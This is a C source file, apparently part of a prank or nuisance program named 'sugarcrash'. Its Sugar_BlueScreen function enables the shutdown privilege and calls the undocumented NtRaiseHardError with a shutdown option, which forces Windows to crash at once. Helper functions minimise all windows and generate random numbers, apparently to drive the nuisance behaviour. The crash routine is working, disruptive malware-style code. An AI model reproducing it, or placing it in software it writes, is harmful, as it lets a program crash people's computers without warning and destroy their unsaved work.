#include "sugarcrash.h"

#include <Psapi.h>

#include "sugarntdecl.h"

/* https://github.com/reactos/reactos/blob/master/sdk/include/reactos/undocshell.h#L841 */
#define TRAYCMD_SHOW_DESKTOP    419

#define TRAYWINDOWCLASS         TEXT("Shell_TrayWnd")

static DWORD g_dwXorShiftState = 0;

VOID Sugar_BlueScreen(NTSTATUS ntErrorStatus)
{
    BOOLEAN             bEnabled;
    HARDERROR_RESPONSE  response;

    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(
        ntErrorStatus, 0, 0, 0, OptionShutdownSystem, &response);
}

VOID Sugar_MinimizeAll(VOID)
{
    HANDLE hWnd = FindWindow(TRAYWINDOWCLASS, NULL);

    if (hWnd != NULL)
        SendMessage(hWnd, WM_COMMAND, (WPARAM)TRAYCMD_SHOW_DESKTOP, 0);
}

/* https://en.wikipedia.org/wiki/Xorshift */
DWORD Sugar_Random(DWORD dwMin, DWORD dwMax)
{
    DWORD dwTemp = g_dwXorShiftState;

    if (dwTemp == 0)
        dwTemp = GetTickCount();

    dwTemp ^= dwTemp << 13;
    dwTemp ^= dwTemp >> 17;
    dwTemp ^= dwTemp << 5;

    g_dwXorShiftState = dwTemp;

    return dwMin + g_dwXorShiftState % (dwMax + 1 - dwMin);
}